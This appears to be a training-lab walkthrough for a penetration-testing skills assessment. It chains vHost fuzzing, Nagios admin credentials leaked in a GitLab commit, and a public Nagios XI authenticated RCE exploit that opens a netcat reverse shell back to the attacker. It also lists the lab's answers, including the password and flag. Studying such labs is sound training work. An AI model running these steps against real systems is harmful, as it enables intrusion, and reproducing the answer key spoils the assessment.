# Attacking Common Applications — Skills Assessment II

## ID
531

## Module
Attacking Common Applications

## Kind
lab

## Title
Skills Assessment II — vHost Enumeration → GitLab Credential Leak → Nagios XI Authenticated RCE

## Description
Perform vHost fuzzing against `inlanefreight.local` to discover WordPress, GitLab, and Nagios XI instances, extract hardcoded Nagios admin credentials from a GitLab commit, then exploit Nagios XI 5.7.5 authenticated RCE (49422.py) to obtain a reverse shell and retrieve the flag.

## Tags
vhost, gobuster, wordpress, gitlab, nagios-xi, rce, credential-leak

## Commands
- sudo sh -c 'echo "<TARGET_IP> inlanefreight.local" >> /etc/hosts'
- gobuster vhost -u inlanefreight.local -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50 -k -q --append-domain
- sudo sh -c 'echo "<TARGET_IP> monitoring.inlanefreight.local blog.inlanefreight.local gitlab.inlanefreight.local" >> /etc/hosts'
- searchsploit nagios 5.7
- searchsploit -m php/webapps/49422.py
- nc -nvlp <LPORT> &
- python3 49422.py http://monitoring.inlanefreight.local nagiosadmin '<PASSWORD>' <LHOST> <LPORT> &
- cat f5088a862528cbb16b4e253f1809882c_flag.txt

## What This Section Covers
This skills assessment simulates an external penetration test where a seemingly uninteresting host turns out to be running multiple web applications behind virtual hosts. The attack chain spans three distinct applications — WordPress (blog), GitLab (source code), and Nagios XI (monitoring) — and demonstrates how information leakage in one application (hardcoded credentials in a GitLab commit) can be leveraged to compromise another (authenticated RCE on Nagios XI). This is a realistic scenario that tests iterative enumeration, cross-application credential reuse/leakage, and chaining findings across services to achieve code execution. The key lesson is that a single host can harbor multiple attack surfaces behind vHosts, and credential hygiene across applications is often the weakest link.

## Methodology
1. **Add the base domain to /etc/hosts** — Before any web enumeration, add the target IP with the domain `inlanefreight.local` to `/etc/hosts`:
   ```
   sudo sh -c 'echo "<TARGET_IP> inlanefreight.local" >> /etc/hosts'
   ```
   This is required because the target uses name-based virtual hosting — visiting by IP alone won't resolve to the correct application.

2. **vHost fuzzing with Gobuster** — Fuzz for subdomains/vHosts using Gobuster's `vhost` mode:
   ```
   gobuster vhost -u inlanefreight.local -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50 -k -q --append-domain
   ```
   Breaking down the flags:
   - `vhost` — virtual host brute-forcing mode (sends `Host:` header variations)
   - `-u` — base domain to fuzz against
   - `-w` — wordlist of subdomain names to try
   - `-t 50` — 50 concurrent threads
   - `-k` — skip TLS verification
   - `-q` — quiet mode, only show discoveries
   - `--append-domain` — automatically appends `.inlanefreight.local` to each wordlist entry

   Three vHosts are discovered:
   - `blog.inlanefreight.local` — Status 200, Size 50119 (WordPress)
   - `monitoring.inlanefreight.local` — Status 302, redirects to `/nagiosxi/login.php` (Nagios XI)
   - `gitlab.inlanefreight.local` — Status 301, redirects to port 8180 (GitLab)

3. **Add all discovered vHosts to /etc/hosts** — Add all three subdomains in a single entry:
   ```
   sudo sh -c 'echo "<TARGET_IP> monitoring.inlanefreight.local blog.inlanefreight.local gitlab.inlanefreight.local" >> /etc/hosts'
   ```
   All three vHosts resolve to the same target IP — the web server routes requests based on the `Host` header.

4. **Identify WordPress on the blog vHost** — Visit `http://blog.inlanefreight.local` in a browser. The page is clearly WordPress (theme, structure, wp-content paths). Confirm by viewing the page source and checking the `<meta name="generator" content="WordPress ...">` tag. The URL of the WordPress instance is `http://blog.inlanefreight.local`.

5. **Register on GitLab and explore public projects** — Visit `http://gitlab.inlanefreight.local:8180/` (note the non-standard port 8180 from the 301 redirect). GitLab allows self-registration — click "Register now" and create an account. After logging in, navigate to **Explore** → **Projects** to view public repositories. The public project is named **Virtualhost**.

6. **Extract credentials from GitLab commit history** — While exploring GitLab projects, navigate to the **Nagios Postgresql** project. Inspect the commit history — the latest commit message mentions updating INSTALL with "master password." Click into that commit diff to find the exposed credentials: `nagiosadmin:oilaKglm7M09@CPL&^lC`. This is a classic credential leak in version control — developers committing sensitive data to repositories.

7. **Log into Nagios XI with leaked credentials** — Visit `http://monitoring.inlanefreight.local` which redirects to the Nagios XI login page. Sign in with `nagiosadmin` / `oilaKglm7M09@CPL&^lC`. Once logged in, check the bottom-left corner of the dashboard to identify the version: **Nagios XI 5.7.5**.

8. **Find an exploit for Nagios XI 5.7.x** — Use searchsploit to find known exploits:
   ```
   searchsploit nagios 5.7
   ```
   The relevant result is `Nagios XI 5.7.X - Remote Code Execution RCE (Authenticated)` at path `php/webapps/49422.py`. Copy it to the working directory:
   ```
   searchsploit -m php/webapps/49422.py
   ```

9. **Set up a netcat listener and run the exploit** — Start a netcat listener in the background:
   ```
   nc -nvlp <LPORT> &
   ```
   Note the job number (e.g., `[9]`) for later use with `fg`. Then run the exploit, also backgrounded:
   ```
   python3 49422.py http://monitoring.inlanefreight.local nagiosadmin 'oilaKglm7M09@CPL&^lC' <LHOST> <LPORT> &
   ```
   The exploit script:
   - Extracts a login NSP (nonce/CSRF) token from the Nagios XI login page
   - Authenticates with the provided credentials
   - Extracts an upload NSP token from the upload form
   - Base64-encodes a bash reverse shell payload
   - Uploads the payload through the authenticated file upload functionality
   - Triggers execution, resulting in a reverse shell callback

   The shell connects as `www-data` and lands in `/usr/local/nagiosxi/html/admin`.

10. **Interact with the reverse shell** — Press Enter to get a clean prompt, then bring the netcat listener to the foreground using `fg <JOB_ID>` (e.g., `fg 9`). Confirm access with `whoami` (returns `www-data`).

11. **Retrieve the flag** — The flag file is in the landing directory of the reverse shell:
    ```
    cat f5088a862528cbb16b4e253f1809882c_flag.txt
    ```

## Multi-step Workflow
```
# 1. Set up /etc/hosts
sudo sh -c 'echo "<TARGET_IP> inlanefreight.local" >> /etc/hosts'

# 2. Fuzz for vHosts
gobuster vhost -u inlanefreight.local -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50 -k -q --append-domain

# 3. Add discovered vHosts
sudo sh -c 'echo "<TARGET_IP> monitoring.inlanefreight.local blog.inlanefreight.local gitlab.inlanefreight.local" >> /etc/hosts'

# 4. Browse blog.inlanefreight.local → WordPress
# 5. Register on gitlab.inlanefreight.local:8180 → find "Virtualhost" project
# 6. Inspect "Nagios Postgresql" project commit history → find nagiosadmin creds
# 7. Log into monitoring.inlanefreight.local with leaked creds → Nagios XI 5.7.5

# 8. Find and copy the exploit
searchsploit nagios 5.7
searchsploit -m php/webapps/49422.py

# 9. Start listener and run exploit
nc -nvlp <LPORT> &
python3 49422.py http://monitoring.inlanefreight.local nagiosadmin 'oilaKglm7M09@CPL&^lC' <LHOST> <LPORT> &

# 10. Interact with shell
fg <NC_JOB_ID>
whoami
cat f5088a862528cbb16b4e253f1809882c_flag.txt
```

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| What is the URL of the WordPress instance? | http://blog.inlanefreight.local | vHost fuzzing with Gobuster → visit blog subdomain → WordPress confirmed via meta generator tag |
| What is the name of the public GitLab project? | Virtualhost | Register on GitLab → Explore → Projects → public project listed |
| What is the FQDN of the third vhost? | monitoring.inlanefreight.local | Gobuster vhost fuzzing output — third discovered vHost |
| What application is running on this third vhost? (One word) | Nagios | Visit monitoring.inlanefreight.local → redirects to Nagios XI login page |
| What is the admin password to access this application? | oilaKglm7M09@CPL&^lC | GitLab → Nagios Postgresql project → commit history → "master password" commit diff |
| Obtain reverse shell access and submit flag.txt contents | afe377683dce373ec2bf7eaf1e0107eb | Exploit 49422.py authenticated RCE → reverse shell as www-data → cat flag file in landing directory |

## Key Takeaways
- **vHost fuzzing is mandatory on web engagements** — a single IP can host multiple completely different applications behind name-based virtual hosting; scanning by IP alone misses all of them; always add base domains to `/etc/hosts` and fuzz for subdomains
- **`--append-domain` flag in Gobuster vhost mode** — without it, Gobuster sends bare wordlist entries as the Host header instead of appending the base domain; this is a common source of missed results
- **GitLab self-registration is a goldmine** — when GitLab allows open registration, you can create an account and access all public (and sometimes internal) repositories; always check for this
- **Credential leaks in commit history** — developers frequently commit sensitive data (passwords, API keys, connection strings) and then "fix" it in a later commit, but the old commit still contains the secret; always review full commit diffs, not just current file contents
- **Cross-application credential reuse** — the Nagios admin password was stored in a GitLab repo; in real engagements, credentials found in one system frequently unlock others; maintain a running credential list and test every credential against every login surface
- **searchsploit for quick exploit discovery** — `searchsploit <product> <version>` is the fastest way to check for public exploits; `-m` copies the exploit to your working directory without modifying the original
- **Backgrounding listener + exploit** — the `&` operator backgrounds processes so you can run both the listener and exploit from the same terminal; use `fg <JOB_ID>` to bring the listener to the foreground once the shell connects
- **Alternative path via Metasploit** — `exploit/linux/http/nagios_xi_plugins_filename_authenticated_rce` is the Metasploit equivalent; either approach works, but the Python script is more portable and doesn't require Metasploit

## Gotchas
- **The Nagios password contains special characters (`@`, `&`, `^`)** — when passing it as a command-line argument to the exploit script, wrap it in single quotes to prevent shell interpretation; double quotes will break on `&` which backgrounds the process, and no quotes will fail on `^` and `&`
- **GitLab runs on port 8180, not 80 or 443** — the Gobuster output shows a 301 redirect to port 8180; if you visit `gitlab.inlanefreight.local` on port 80 you'll get redirected, but make sure your /etc/hosts entry is correct and you're accessing port 8180 directly for GitLab
- **The flag file has a hash-prefixed filename** — it's not just `flag.txt` but `f5088a862528cbb16b4e253f1809882c_flag.txt`; use `ls` in the landing directory to find the exact filename rather than guessing
- **The reverse shell lands as `www-data`** — this is an unprivileged web server user; the flag happens to be readable, but in a real engagement you'd need privilege escalation for full system access
- **Don't confuse the three vHosts' order** — Q3 asks for "the third vhost" which is `monitoring.inlanefreight.local`; the ordering depends on Gobuster's output, not alphabetical order
- **NSP tokens (CSRF protection)** — the 49422.py exploit handles Nagios XI's CSRF tokens automatically by extracting them before each request; if you try to replicate the exploit manually (e.g., via curl), you need to handle these tokens yourself
